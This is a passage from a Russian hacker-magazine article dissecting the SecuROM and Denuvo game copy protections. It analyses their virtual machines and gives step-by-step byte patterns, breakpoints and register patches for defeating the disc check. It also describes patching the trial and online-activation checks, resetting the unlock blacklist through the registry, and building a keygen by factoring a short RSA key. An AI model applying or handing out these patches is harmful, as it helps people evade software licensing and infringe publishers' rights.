рил, что её нереально взломать и задавался вопросом, когда это сделают. До-
читав весь топик, мне оставалось только вскричать: «Да! Разобрать по винти-
кам мощную и непробиваемую защиту более чем реально!» Успешный разбор
виртуальной машины, запуск игры в обход всей логики проверки компакт-диска
без любимых «алкоголей» и Daemon Tools, кейген для онлайновой активации
(PA Unlock), — всё это оказалось реально.

ВИРТУАЛЬНАЯ МАТЕМАТИКА
Мне хорошо запомнилось, как в «Искусстве дизассемблиро-
вания» Крис Касперски описывал преобразование в байт-
код как наиболее стойкую и мощную защиту от реверсинга.
На ее преодоление хакеру потребуется чуть ли не вся жизнь
и даже немного больше. Что до SecuROM 7.33.017, то на
понимание принципов работы и разбор структуры вирту-                                                        INFO
альной машины у меня ушло две полных недели, а уже через
месяц я готов был написать декомпилятор.                          Подробнее об
                                                                                устройстве вир-   Что для этого нужно? Всего лишь научиться мыслить так,                                                                               туальной машины
как «мыслит» виртуальная машина, то есть рассматривать      SecuROM читай
совокупность ассемблерного кода на еще более высоком     в статье «Тибериум-
                                                                     ный реверсинг»уровне, чем какой нибудь С++. С другой стороны, если бы
                                                                                     («Хакер» №156
не запрятанные в коде строки ASCII с шутками разработчи-                                                                                   за апрель
ка, я бы мог подумать, что каждый раз ломаю одну и ту же        2012 года).
виртуальную машину.
  В двух словах, VM представляет собой совокупность независимых друг от
друга кусков кода. Привычное слово «функция» к хендлам не применимо, хотя
бы потому, что машинный стек здесь не играет основополагающей роли, как
и регистры процессора (EAX, ECX, ESP и так далее). Если трассировать хен-
длы, склыдвается впечатление, что мы прыгаем по островкам. Роли хендлов
бывают разные.
•  Стартовые хендлы. Инициализируют виртуальные регистры VM, вытаскива-
   ют ссылку на ленту p-code. Выполняются в самом начале.
•  Обычные хендлы. Выполняют примитивные операции — перекладывают
   данные, выполняют простые операции вроде XOR. 95% работы VM делают
   эти ребята.
•  Служебные хендлы. Отвечают за вызовы внешних функций, которые напря-
  мую не относятся к VM, а также за их обработку и упаковку обратно в обмен-
   ник VM. Восстанавливают реальное состояние стека и регистров CPU.
•  Хендлы выхода из VM. Их нужно искать в первую очередь. Знаем начало, на-
  шли конец, значит цепочка вскрыта.

Вместо физических регистров CPU, в VM используются свои виртуальные ре-
гистры — этакая спираль, вокруг которой танцуют хендлы. В обычном понима-
нии это главная структура (typedef struct VM_registers), в которой пропи-
саны ключевые переменные для функционирования VM. Примыкает к этой
структуре специально выделенная зона в памяти — она отведена под обмен
данными между «островками». И, наконец, лента p-code, которая в каждом ин-
дивидуальном случае служит пошаговой инструкцией: на какой примитив пры-
гнуть, из какой ячейки в зоне обменна данными (или памяти) вытаскивать ин-
формацию. В ленту p-code также пихают всякие зашифрованные данные:
офсеты, адреса, константы и адреса OEP (Original Entry Point), которые восста-
навливаются в защищаемой программе по ходу исполнения.

ШУТКИ БЛАУКОВИЧА
Разбирая виртуальную машину, нельзя не заметить строки ASCII, которые Бла-
укович преподносит как пасхальные яйца. Только ради этого, я попереломал
два десятка виртуальных машин :) «Nobody move, nobody gets hurt», «< space
for rent >», «You Are Now In A Restricted Area», «yates stilL Here kinda Ooooh»,
«Masses against classes», «cut my life into pieces (:», «FiSHy WiSHy», «ere, wuts goin
on»… это всё оттуда. Как и анекдот про улитку в баре: «A snail walks into a bar
and the barman tells him theres…» («Улитка входит в бар, и бармен говорит ей,
что есть…» — продолжение ищите в восьмой версии). Помимо веселья, от этих
строк есть и реальная польза — можно точно определить версию VM, которая,
к слову, редко менялась, даже если статическая версия защиты была другой.



Одна из особенностей SecuROM — это шаблонность и предсказуемость в ра-
боте с виртуальными регистрами. Во всех хендлах, кроме выхода из VM, идут
стандартные шаблонные действия с виртуальными регистрами (назовем их
«Главным хранилищем»), которые выполнялись в строгой последовательности.
Чаще всего виртуализируется инструкция MOV [r32], r32. Зная это, можно,
наплевав на обфускацию, составить карту работы всех хендлов, и вуаля: 60%
работы по девиртуализации выполнено!
   Есть и еще более простая лазейка: в некоторых случаях по сдвигу указате-
ля ленты p-code ADD +4 (, Y в конце, можно без анализа всего хендла точ-
но угадать его роль! Там, где, для рабочих хендлов Y = 4 (один управляющий
DWORD), 8-байт (управляющий DWORD + DWORD данных); в остальных же слу-
чаях (есть нечетные байты), сдвиг «кривой», это свидетельствует об отсутствии
значимых операций на данном примитиве.
   Хранилище дельта-смещений всех 255 хендлов («Хранилище №1,5» для
простоты) — наш надежный навигатор и отличное место для установки пере-
хватчиков, «виртуальная» таблица экспорта. Данные в нем шифруются динами-
чески, перед началом самого раннего входа в VM. Шифрование производится
на основе CPUID. Это значит, что разработчики сделали аппаратную привязку:
если мы снимем дамп и прикрутим к нему VM, то работать NoCD/NoDVD будет
только на нашей машине. Но все так радужно лишь в уме Блауковича. На самом
же деле с такой замечательной структурой, как открытая таблица, где любезно
собраны все адреса примитивов, нам не важно, зашифровано что-то или нет.
Глупо не воспользоваться таким огромным подарком — нужно лишь разобрать
каждый из 255 хендлов, руководствуясь находкой из предыдущего абзаца.
  К сожалению, хранилище дельта-смещений есть только в седьмой версии
SecuROM. Позже до Sony DADC дошло, почему взломщики так свободно и изде-
вательски гуляют по виртуальной машине — наше «Хранилище №1,5» уничтожи-
ли… и лучше бы они этого не делали! :) Конечно, жизнь немного усложнилась –
на руках теперь нет точного местоположения всех хендлов, надо трассировать
всю машину, чтобы откопать их адреса. Но нет худа без добра: Рейнгард Бла-
укович снова невольно помог в трассировке, когда добавил в восьмую версию
так называемый «коллектор», куда стекается все управление от всех хендлов,
а заодно убрал обфускацию, понадеявшись на сплетение безусловных перехо-
дов. В итоге, контролировать виртуальную машину можно даже по отдельным
инструкциям в хендле, а не по целым примитивам, как в седьмой серии.

PUSHFD
XCHG DWORD PTR DS:[EBX+0C],EAX
ADD DWORD PTR DS:[EBX+20],EAX
XCHG DWORD PTR DS:[EBX+0C],EAX
POPFD
PUSH DWORD PTR DS:[EBX+20]
JMP ret_label
ret_label : RETN

Область обмена данными между хендлами – «план Б». Это самая лакомая и моя
любимая часть виртуальной машины SecuROM 7-8. Именно благодаря ней не
обязательно копаться в коде VM и вникать в суть интерпретации байт-кода.
Данные — ключ ко всему! Для SecuROM 7 абсолютно реально написать про-
стой анализатор данных, которые машинка бережно хранит в области обмена
данными и с большой долей вероятности вычислить всю цепочку виртуализи-
рованных функций. Это самый универсальный метод борьбы в случае I и II типа
вызова машины. Просто фантастика!
  В SecuROM 8 для области обмена данными добавили флаг EXECUTE, и VM
начала туда добавлять важный исполняемый код. Это потребовало усовершен-
ствовать анализатор. Помимо этого различий между виртуальной машиной
SecuROM 7 и 8 не так много.
  В SecuROM 7 широко использовалась обфускация кода. Только вот са-
мые ходовые хендлы в виртуальной машине обфускации не подвергались, да
и сама обфускация оставляла желать лучшего. Блаукович понял это и убрал её
из восьмой версии, заменив на паутину из безусловных переходов (по анало-
гии с SafeDisk 4.5).

ВИРТУАЛЬНАЯ ГЕОМЕТРИЯ
Компакт-диски. Не думай, что речь сейчас пойдет об эмуляции, Alcohol 120%,
Daemon Tools, геометрии диска, секторах и блоках. Ничего подобного, всё
это — прошлый век!
  Уже в 2007 году существовало как минимум две дыры, которые позволяли
без всяких «алкоголей», настоящих лицензионных дисков и их мини-образов
пробивать проверку диска в приводе. Первую быстро закрыли (магический
бит), для обхода второй был специальный скрипт для OllyDbg (трюк с управляю-
щими байтами и мгновенным выходом на OEP), который применим только для
седьмой версии австрийской защиты.
  Самый громкий успех имела секретная третья дырища, подобраться к ко-
торой можно только при полном реверсинге модуля проверки диска. Этот ме-
тод годится для абсолютно любого билда в диапазоне от седьмой до самой
последней восьмой версии. Вот краткая методика поиска нужных инструкций
и перезаписи важных байтов.
1. Для начала нам понадобится обычный физический привод (можно и вирту-
   альный, но тогда сами скрывайте свой Daemon Tools от негодующего Рейн-
   гарда) и _любой_ диск CD или DVD.
2. Вставляем его в дисковод и запускаем игрушку (к примеру, GTA IV или Brave)
   под OllyDbg. Естественно, SecuROM завопит «Wrong disc inserted. Please
    insert the original CD/DVD. Please have a look at http://www.securom.com/
   message.asp?m=wrongdisc for further, more detailed information». Но, оказы-
   вается, это несложно лечится! В двух словах, проверка диска защитой раз-
   бита на две части: сигнатурная и геометрическая (углы между секторами,
   синусы, дорожки).
3. Сигнатурная проверка — Уровень 1. Разводка 1. Ищем следующую после-
   довательность байтов: 83E0 1F 3C 1F5 (то есть две инструкции) и ставим
   первый Hardware Breakpoint.

   AND EAX,0000001F
   CMP AL,1F

  В AL/EAX заносим 0x1F (31). Правильно угаданное местоположение и пат-
   чинг только этой разводки заставляет SecuROM выплюнуть сообщение:
   «Cannot authenticate the original disc. Your disc may require a different software
   version. Please contact the manufacturer of your application or visit http://www.
   securom.com/message.asp?m=disc for further information».

4. Сигнатурная проверка – Уровень 1. Разводка 2. Ищем последовательность
   84 98 C0 07 00 00 и ставим второй Hardware Breakpoint.

   TEST BYTE PTR DS:[EAX+7C0],BL //BL = 1 инструкции

  В EAX+0x7C0 может находиться любое число от 2 до 10 (в идеале там должна
   быть 9). Это какие-то специальные байты структуры, которая задает число
   проходов. Чем меньше число – тем меньше проходов и быстрее проходит
   сигнатурная проверка.

5. Сигнатурная проверка – Уровень 1. Разводка 3. Возможны два варианта.
   • В седьмой версии ищем последовательность 80BF F2070000, инструк-
     ция CMP BYTE PTR DS:[EDI+7F2],0
   • В восьмой версии ищем последовательность 80 78 02 00, инструкция
     CMP BYTE PTR DS:[EAX+2],0

   Ставим третий Hardware Breakpoint.

  В EDI+7F2/EAX+2 находится множитель для интервала проверки. В идеале
   здесь должна стоять двойка. По факту – может быть любое ненулевое число,
   но рекомендую указывать от 5 до 1, чтобы попасть в интервал с первого раза.

6. Отдельно! Ручное исправление ошибки 2fix. Если не исправить, то процесс
   аварийно завершится (SecuROM неверно обсчитывает свои данные с дис-
    ка)! Ищем конструкцию, в CONST (АДРЕС) для левого диска всегда будет 0.
   Тут придется немного погадать.

   CMP BYTE PTR DS:[CONST],0
   PUSHFD
   PUSH CONST
   JBE SHORT ADDRESS

   Ставим четвертый Hardware Breakpoint. В CONST ( в идеале должна быть
   двойка. Отсюда и название — 2fix. Если все сделано правильно, то запустит-
   ся вторая часть — геометрическая проверка: курсор сменится на крутящий-
   ся диск (temp.ani в директории %TEMP). После смены обратно начинается
   контрольный подсчет попадания в заданный интервал. Внутри проверки ге-
   ометрии (когда курсор становится диском) важных разводок нет.

7. Уровень 2.Найти и запатчить три раза разводки вида:

   FLD QWORD PTR DS:[CONST]
   FSUB QWORD PTR DS:[CONST]
   FMUL QWORD PTR DS:[CONST]
   FCOMP QWORD PTR DS:[CONST]
   FSTSW AX
   TEST AH,05

   Адрес в FLD QWORD PTR DS:[адрес] всегда один и тот же во всех трех.
   Находим и ставим точку останова на память. Патчится результирующий ре-
   гистр AH:

                     Для geometry-1  Для geometry-2  Для geometry-3
    Значение старшего
                           0             1             1
    регистра AH

     Если у тебя есть настоящий лицензионный диск к любой другой игрушке,
  защищенной SecuROM, то тут всё еще проще: проходим только «Уровень 1.
   Разводка 1» (сигнатуры) и «Уровень 2». Причем в некоторых случаях может
   повезти, и читерить с коррекцией интервалов под геометрию вообще не по-
   требуется.
    В некоторых играх после проверки геометрии идет проверка DFA/DFE
   (код ошибки >= 9000). Если тут все в порядке, тогда запускается вторичная
   полная проверка наличия отладчика, OEP, а затем и основной код игры.

   Вот так позорно терпит поражение самая навороченная в мире защита ком-
пакт-дисков на основе геометрии. Остается ликовать или задаваться вопросом
о том, как игровые компании дали себя так обмануть. Вот только ответа никто
не даст — как минимум потому, что SecuROM больше не существует. Справед-
ливости ради, скажу, что у Tages и SolidShield все было еще печальнее.

ВИРТУАЛЬНАЯ КРИПТОГРАФИЯ ИЛИ ULTRA-KILL
«Ну и фиг с ними, с лазерными кругляшками и геометрией. Проиграли и лад-
но!», — подумал Блаукович и родил на свет новую фичу — онлайновую актива-
цию, известную также как SecuROM PA Unlock (а потом еще и DFA, но ту слишком
быстро научились эмулировать, банально используя API самого же SecuROM).
   Есть мнение, что для онлайновой активации нельзя сделать гейген. Ерунда!
Всю цепочку работы этой технологии успешно отреверсили и даже восстано-
вили алгоритмы работы серверов активации Sony.

                                                          Игрушка Ys SEVEN
                                                                 использует самое
                                                              красивое оформ-
                                                            ление онлайновой
                                                                активации, опираясь
                                                             на стандартные воз-
                                                           можности paul.dll





Суммируя информацию, которой я обладаю после взлома PA Unlock, могу ска-
зать, что в целом есть два подхода к взлому онлайн-активации SecuROM: со
знанием криптографии и без знания криптографии. Строго говоря, есть еще
третий – использование описанной выше уязвимости, которая заставляет
SecuROM мгновенно распаковывать основной код и передавать управление
на OEP. Это позволяет обойти сразу все модули защиты, но работает только с
версиями 7.3x и 7.4x.
  Начнем с последнего подхода. Допустим, мы никогда не слышали о DES
и RSA и нам абсолютно все равно, какая структура у unlock code, и что там вы-
числяется внутри с помощью пакета OpenSSL (на самом деле, не все крипто-
графические функции модуля проверки онлайн-активации оттуда). У нас есть
легендарный paul.dll, обертка (wrapper) для основного исполняемого файла.
В paul.dll находится экспортная процедура drm_pagui_doit, которая сначала
проверяет состояние активации (вызывает функции, прописанные в главном
exe) и в зависимости от ответа предлагает пройти её, либо возвращает едини-
цу в случае PA_ACTIVATION_SUCCESS.

TRIAL MODE
Зарубежный издатель BigFish использует SecuROM в режиме Trial. Для Trial
mode существует универсальный эксплоит, который позволяет обходить пря-
мую верификацию на сервере и задействовать Manual Activation с последую-
щей генерацией unlock code в кейгене. Сделать это просто: нужно заменить
новые версии paul.dll (v2.x) на древние 1.x. Или берем и правим EAX = 1 после
вызова doit_check_pa — вот и весь пробный режим!



Собственно, последней фичей народ и воспользовался: достаточно пропат-
чить paul.dll, и всё готово. С внутренним устройством онлайновой активации
практически никто разбираться не стал. Но время шло — вышла восьмая вер-
сия SecuROM. «И конечно Sony DADC приложила мощные усилия, чтобы пре-
кратить эту вакханалию?» — спросишь ты. На первый взгляд, да: с восьмой вер-
сией нехитрое ковыряние paul.dll не приведет к желаемому результату. Но на
самом деле в Sony всего лишь чуть-чуть улучшили старую технологию, дописав
несколько строк кода. В новой версии до вызова paul.dll введены две контроль-
ные переменные, которые инициализируются с дефолтными значениями. Нуж-
но лишь откопать их в толще обфусцированного кода.

0120BF24   MOV DWORD PTR DS:[2CB87FC],7F83983E
0120BF2E   MOV DWORD PTR DS:[2CB87F8],0FEAE7DB

Как и в седьмой версии, paul.dll вызывает функцию проверки состояния онлай-
новой активации doit_check_pa, которая теперь перед тем, как отдать зна-
чение, создает его зашифрованную копию в первой переменной. Данный код
виртуализирован, однако его очень просто вывести на чистую воду с помощью
нашего SPR_I.

#SecuROM_VM_start
MOV EBX, EAX
XOR EBX, 0xBDDE699D
MOV [0x2CB87F8], EBX
POP EBX
RET EAX
#SecuROM_VM_end

                                                             SPR_I – охотник за
                                                            виртуальными ма-
                                                     шинами SecuROM





Далее оставляем paul.dll в покое и проверяем результат его работы. Если PA_
ACTIVATION_SUCCESS (return 1), тогда SecuROM направляет процессор на вто-
рую копию проверки активации (drm_pagui_doit), только уже без участия paul.
dll — все необходимое продублировано в исполняемом файле. Разница лишь
в том, что оставшаяся переменная используется для хранения ответа-дубля
(MOV 0x2CB87FC (, EBX). Дальше же всё очевидно – имеем две переменных
с ответами от двух проверок, остаётся разве что дописать конечную проверку.

0122F711   CMP DWORD PTR DS:[2CB87FC],7F83983E
0122F71B   PUSHFD
0122F71C   PUSH 2919
0122F721   JE SHORT 0122F734
…
0122F74D   CMP DWORD PTR DS:[2CB87F8],0FEAE7DB
0122F757   PUSHFD
0122F758   PUSHFD
…
0122F8B2   MOV EAX,-35
0122F8B7   MOV EAX,DWORD PTR DS:[EAX+2CB8831] // == 2CB87FC
0122F8BD   CMP EAX,DWORD PTR DS:[2CB87F8]
0122F8C3   PUSHFD
0122F8C4   PUSH 3415
0122F8C9   JE SHORT 0122F8DD

Этот код требует некоторых пояснений. Пройти SecuROM PA можно в двух слу-
чаях: когда обе контрольные переменные имеют присвоенное по умолчанию
значение или равны между собой. Все остальные ветки исполнения кода вводят
SecuROM в ступор, и процесс банально завершается с кодом -1 (FAIL!). Обрати
внимание, что на таких скрытых переменных могут базироваться так называемые
«триггеры» — привязки частей исходного кода игры. Очевидно, что в данном слу-
чае проблемы могут начаться уже после успешного восстановления дампа.
   Итак, мы разобрались с самым простым вариантом вскрытия SecuROM PA
Unlock. Но ведь мы не ищем легких путей? Если рубить, то рубить на корню! Во-
оружаемся томиком Шнаера, плагином IDA Signsrch и HexRays (IDA Pro, есте-
ственно, прилагается в комплекте) и начинаем делать первые шаги в написа-
нии генератора unlock code. Перед тем, как выбрать главное направление для
удара и погрузится в нативный режим SecuROM PA, предлагаю провести ана-
лиз имеющихся разведданных.
  Ты наверняка хоть раз видел, как выглядит окно онлайновой активации
SecuROM. Здесь есть: unlock request code (код-запрос); serial number (серий-
ный номер); unlock code (код-ответ или UC); Первый всегда генерируется при
показе окошка активации, причем буквы и цифры всегда разные даже в пре-
делах одной машины. На самом деле это дешевый обман от Рейнгарда — на
одной и том же железе код всегда одинаков. Рандомизации как таковой нет –
иллюзия создается с помощью kernel32.GetSystemTimeAsFileTime(pFilet
ime) из WinAPI и жестко прописанных констант.

unsigned __int64 v1; // ST00_8@1
unsigned __int64 v2; // qax@1
struct _FILETIME SystemTimeAsFileTime; // [sp+0h] [bp-8h]@1
GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
HIDWORD(v1) = ((*(_QWORD *)&SystemTimeAsFileTime + 0x2AC18000ui64) >>
0x20u) - 0x19DB1DF;
LODWORD(v1) = SystemTimeAsFileTime.dwLowDateTime + 0x2AC18000;
v2 = v1 / 0x989680;
if ( a1 )
    *(_DWORD *)a1 = v2;
return v2;

Данные для раскрытия истинного request code заложены в его структуру – соб-
ственно, поэтому он длиннее на пять символов, чем код-ответ. Но это не глав-
ное. Прежде всего, нетрудно догадаться, что request code наверняка содержит
HWID (привязка к железу).
  Из неочевидных данных подскажу, что код-запрос содержит в себе иден-
тификатор игрушки в виде хеша MD5 персонального DES ключа (для каждой
игрушки). На первый взгляд, отреверсенные алгоритмы генерации кода-запро-
са нам ничем не помогут, ведь мы можем сами сгенерировать их миллионами.
Однако это не так! Фокус в том, что оттуда можно выдрать половину кода для
кейгена :)
  По странному совпадению алгоритм генерации кода-запроса содержит об-
ратные функции, которые используются при проверке полученного unlock code
с сервера активации Sony. Впрочем, утюжить «Оллидебагом» надо, прежде
всего, эту самую функцию проверки unlock code (кода-ответа). И прежде чем
мы приступим к её реверсингу, буквально пару слов о serial number.
   Незнание серийного номера – это главное препятствие в получении unlock
code на сайте securom.com. Как выяснилось, этот номер служит только для
сверки по внутренней базе SecuROM. В структуре unlock code для s/n отведен
WORD под его хеш, который на защищенной машине никак не используется.
Лично до меня быстро дошло, что вместо хеша serial number можно писать что
угодно – в валидном виде s/n нам не понадобится. Ситуация
аналогична той, что была с лицензионным диском.
   Итак, начинаем реверсить процедуру проверки unlock
code (UC). Длина UC равна 0x2f (47) символов. За этим коли-
чеством шифрованных байтов скрывается сердце алгоритма
и наш ключ к победе. Структура UC состоит из двух частей:
                                   WWWслужебная часть и HWID-часть. Следуя структуре UC, защита
ведет с ним работу в три нативных уровня: распаковка с раз-   Официальная стра-
бором служебной части, проверка введенного unlock code в   ница онлайн-актива-
                                                                          ции SecuROMсвоем черном списке и расшифровка HWID с последующей
сверкой. Что представляет собой служебная часть, показано   Согласно программе
на картинке, а исходные коды можно найти на сайте eXeL@B.   импортозамещения,
                                                                                                                int соорудил нашуЕсли ты знаком с С/С++, то разобраться не составит труда.
                                                                              страничку SecuROM
Дальше функция за функцией рассмотрим работу SecuROM                                                                        PA Unlock page
с unlock code.                                                                      как у Sony.



                          Продолжение статьи
Coverstory



   Начало статьи
КАК ВЗЛОМАЛИ
SECUROM
ИСТОРИЯ ПОРАЖЕНИЯ САМОЙ МОЩНОЙ DRM
Проходим все этапы реверсинга головоломной
защиты компакт-дисков




Первый этап – DES_free_key и DES_private_key
Группа из трех функций, которые выполняются последовательно. Каждая функ-
ция имеет три аргумента – входной буфер, выходной буфер и длина входного
массива. Они выполняют распаковку переходной структуры unlock code. Я на-
зываю этот код «шелухой».
   Очищенный от «шелухи» UC (а это 25 байтов) передается в главную и послед-
нюю на данном этапе функцию (я называю ее «Level 4»), где криптографическая
составляющая представлена одним стандартным алгоритмом DES с двумя ти-
пами ключей — свободный (DES_free_key) и индивидуальный (DES_private).
Отдельно в этой функции используется самопальная разновидность DES (DES_
warp) со встроенным ключом – как оказалось, это и есть самая запутанная часть
онлайновой активации, несмотря на то, что несложно заставить работать этот
алгоритм в режиме «шифрования», без разбора его внутренностей.
1. Исследуя длинный цикл do-while, где используются эти алгоритмы, я при-
  шел к выводу, что 25 байтов UC могут быть зашифрованы любым из ста клю-
   чей DES_free_key, то есть мы имеем жестко вшитый набор ключей. Если
   ни один ключ DES из набора не подошел, то добро пожаловать к выходу.
   Условие продолжения работы с расшифрованным unlock code определяет
   самый первый байт после работы des_decrypt — это CRC от всей правой
   части (24 байта).
2. Если контрольная сумма правой части сходится с этим байтом, тог-
   да SecuROM допускает, что unlock code настоящий. Теперь алгоритм хо-
   чет убедиться, что UC сгенерирован именно для этой игрушки. Еще один
   слой шифрования убирается с помощью упомянутой выше DES_warp для
   21 байта. И тут в дело вступает MD5. Расчехлять GPGPU для брутфорса не
   требуется — это обычный digest. Защита обращается к первому аргумен-
    ту функции «Level 4», где лежит заготовка для индивидуального ключа DES
   (DES_private_key) – три последовательности по 16 байтов (то есть все-
   го 48), причем для второй и третьей последовательности первые восемь
   байтов всегда одинаковые: 0xE8, 0x96, 0xD4, 0xE1, 0xBD, 0xFC, 0x0E, 0x37
   (заготовка хорошо видна в окне Hex Dump в OllyDbg). Считаем хеш MD5 и
   сравниваем с прописанным в unlock code (длина — два байта).
3. Если хеши совпадают, то SecuROM поймет, что индивидуальный ключ (DES_
   private_key) подходит. Первая последовательность при помощи XOR объ-
   единяется со второй и третьей. Получается шестнадцать байтов, после чего
   первая половина ксорится со второй. В итоге получается DES_private_key
   в дистиллированном виде – 56 бит (собственно, для получения ключа из сво-
   бодного набора выполняется эта же банальная операция). Дальше остает-
   ся только выполнить des_decrypt с этим ключом.
4. Расшифрованные 25 байтов копируются в буфер (второй аргумент) с зати-
   ранием переданных зашифрованных 25 байтов (от «шелухи»). Другими сло-
   вами, входной буфер используется и как выходной.

Итак, unlock code с его полностью расшифрованной служебной частью у нас
на руках. Отдышимся и проанализируем некоторые забавные детали работы
SecuROM на первом этапе.
   Прежде всего, я обратил внимание на то, что заготовка DES_primary_key
(эти 48 байтов) представлена в реестре Windows. Ее можно встретить в HKEY_
CURRENT_USER\Software\DSS\Product  Activation. Значение в виде кучи
непонятных циферок и буковок — это индивидуальные ключи DES для каждой
игры, защищенной SecuROM PA.
   Казалось, вроде бы очевидно, что вместо названия игрушки можно пропи-
сать её DES ключ. Однако я не поленился узнать, откуда функция «Level 4» по-
лучает 48 байтов заготовки. К моему удивлению, этот путь оказался на порядок
тернистей, чем исследование всего остального процесса проверки UC – судя
по всему, Рейнгард боялся, что индивидуальные ключи DES будут подменять
при наличии хотя бы одного валидного unlock code (такой подход был бы умест-
ным при условии динамической подмены HWID). Несмотря на это, я не вижу ни-
какого смысла навешивать такое количество брони на этот участок – всё равно
в самом конце разработчики сами отдают на руки DES_private_key.
  Следующим под раздачу попадает уже элемент из самой структуры UC:
LOCK-байт и его два байта, которые означают количественные характеристики
блокировки. LOCK-байт может принимать значения от 0 до 4. В случае нуля
unlock code не несет никаких ограничений на «железо» и чаще всего оказыва-
ется действительно сброшен. В случае значений от единицы до тройки появля-
ется одно из следующих ограничений: ENDDATE, NUMBERDAYS, NUMBERLAUNCHES
и PLAYTIME. Сломать все три блокировки не составляет труда — берем и нагло
сбрасываем все три байта, заменяя нулями, в только что расшифрованной
структуре unlock code. Теперь при каждом запуске SecuROM будет считать, что
всё в порядке.

ВЕСЕЛЫЕ ОСОБЕННОСТИ SECUROM
•  Исходный код SecuROM PA онлайновой активации байт в байт идентичен
   абсолютно во всех играх (различаются разве что адреса и специальные бу-
   левы константы).
•  Большинство защищенных игр почему-то имеют одинаковый публичный и
   приватный ключи RSA для request code.
• В SecuROM PA есть некий аналог sprintf — этакий штаб онлайновой ак-
   тивации, откуда можно скрытно качать полезную информацию целыми
   ASCII-строками. Дело в том, что если внедрить туда программную точку
   останова, то можно без лишних телодвижений установить, что в данный мо-
   мент делает защита.
• По аналогии с патчингом модуля проверки оригинального диска, всегда
   можно спокойно пропатчить условные переходы после всех трех этапов на-
   тивной проверки unlock code. И плевать, что UC будет «12345-5678-…» - всё
   равно «Activation Success!»


Второй этап — черный список
Не забыл, что существует еще и процедура отзыва введенного unlock code и
s/n? Она называется revoke и не дает использовать один и тот же unlock code
более трех раз. Только что расшифрованный unlock code длиной 25 байтов про-
веряется на присутствие в черном списке, который хранится в реестре (HKCU\
Software\DSS\Product Activation плюс заготовка DES_private_key).
   Получается, что произвести локальный revoke (очистить black-list) можно
своими руками без помощи Sony – просто берём regedit и сносим нужную вет-
ку реестра. В особых случаях вооружаемся руссиновским RegDelNull.exe и кру-
шим HKEY_CURRENT_USER\Software\SecuROM с его нуль-терминантом в конце
веток !CAUTION! NEVER DELETE OR CHANGE ANY KEY и License information.
Это простой и эффективный способ получения виртуального ключика для треть-
его нативного уровня исследования SecuROM PA.

Третий этап — RSA
Прежде всего, честно скажу, что специально не буду раскрывать некоторые де-
тали работы последнего алгоритма. Иначе уж слишком просто, получается, от-
дать весь код кейгена в руки общественности. Намекну только, что кроме RSA
здесь учувствуют и другие знакомые по прошлым пунктам алгоритмы.





80_PA – кейген, взламывающий всё, начиная от Bioshock и заканчивая самыми
последними играми, которые защищены SecuROM PA

RSA здесь представлен в стандартном исполнении mod. По сравнению с ним
DES нервно курит в «Level 4»: SecuROM сам нам дарит ключи DES, и никако-
го фокуса здесь нет. Несмотря на то, что весь третий этап работы с HWID (в
SecuROM, кстати, используется другая аббревиатура – IMEI) разработчики по-
пытались максимально оградить от чужих глаз с помощью VM и сильной обфу-
скации.
  Я установил своеобразный мировой рекорд — весь рейнгардовский забор
был снесен чуть более чем за четыре минуты. Аппаратные точки останова и SPR
I сделали своё дело! Правда, я не сразу понял, что передо мной RSA, а когда
понял, стало очевидно, что закрытый ключ хранится на сервере Sony, и мне его
не достать. Свой HWID не получится зашифровать, и это казалось окончатель-
ным тупиком. Но не тут-то было!
   Концовка внезапно обернулась одним из самых немыслимых подарков, ко-
торый Sony DADC сделала тем, кто отважился дойти до конца в исследовании
Product Activation. Прежде всего, я обратил внимание на «открытую экспонен-
ту» (Public Exponent), которая равна 0x10001h.
   Смотрим длину, которая остается под зашифрованный
HWID от общей структуры unlock code. Выкинув служебную
часть и последний байт (RSA_copy_lenght), получаем 15
байтов (умножаем на 8). Результат навел меня на определен-
ные мысли. Я вставил модуль N в RSA Tool by tE (первое, что
                                    WWWпопалось под руку), факторизовал N и вычислил приватную
экспоненту D.                                                                Cамый главный топик
  Не веря в полученный результат загружаю RSATool2v17.     страны по взлому
exe в отладчик, нахожу реверсингом функцию rsa_encrypt и       SecuROM
вручную подставляю значения – шифрованные байты HWID                                                                      Видео «Тибериумный
совпадают! Далее, используя bdModExp(c, m, e, n) в сор-        реверсинг.
цах BigDigits еще раз проверяю полученный результат. Все      Продолжение»
указывает на то, что благодаря неудачно выбранной длине
                                                                             Первоисточник
ключа RSA и простых множителей, несколько минут назад мы                                                                                  новости
взломали онлайновую активацию SecuROM.                        о взломе Denuvo

DENUVO
Denuvo — новая защита, которая за короткий промежуток времени успела стать
известной. Однако стоят за ней все те же Рейнгард Блаукович и Роберт Эрнан-
дес из города Зальцбург, Австрия. Похоже, их выгнали из Sony DADC, и они
решили снова подзаработать, открыв новую контору на другом конце города.





Denuvo — сферический SecuROM в отладочном вакууме


Меня очень позабавили заявления разработчиков, что Denuvo — это принципи-
ально новая защита. Вывести их на чистую воду не составило труда. Берем све-
женький LordsOfTheFallen.exe и кидаем его в рабочую зону отладчика. Вскрытие
64-разрядного кода пришельца показывает, что внутри — виртуальная машина
с несколькими входами, где первый хендл (он отвечает за инициализацию) вы-
глядит примерно так.

mov esi, dword ptr ss:[rsp+A0] //аргумент №1 (raw на ленту of p-code)
xor esi, CFDCF9B4
ror esi, 9
inc esi
mov rax, 100000000 //hi-addr
add rsi, rax //RSI - pointer to p-code
sub rsp, 140 //стек, как зона обмена данными (VM data exchange area)
lea r12, qword ptr ds:[14FE789F2] // Вау! Хранилище №1,5
mov al, byte ptr ds:[rsi] //извлекает байт из ленты p-code
add rsi, 1
neg al
rol al, 7
inc al
mov rdx, qword ptr ds:[r12+rax*8]  //следующий хендл
dec rdx // статическая расшифровка. В SecuROM на этом месте идет
CPUID
jmp rdx

   Этого достаточно, чтобы констатировать следующие два факта:
1. ребята скурили весь лес в Австрии;
2. перед нами обычный форк седьмой версии SecuROM.

Из того, что я повидал, больше всего на Denuvo похож SecuROM версии 7.42 в
игре Blood Bowl: Legendary Edition. Конкретные различия в следующем:
•  Зона обмена данными между хендлами в стек (sub rsp, 0x140h) — в этом
   случае не нужно ломать голову с многопоточностью при использовании
   кода. Минус такого подхода — дикое количество ошибок при чтении данных
   из стека. Denuvo постоянно ошибается на этом. Идея, скорее всего, была
   подсмотрена в SolidShield v2.x.
•  Для статической расшифровки используется dec (bswap,  sub). Тут уже
   стало очевидно, что для CPUID приготовили место посолидней. Как выясни-
   лось позже — для 64-разрядного ключа.
•  Один аргумент (raw указатель на p-code) вместо двух у SecuROM. Возвра-
   щаться по заданному адресу Denuvo не умеет.
•  Практически  нулевая   антиотладка.  Самое  печальное,   что  ино-
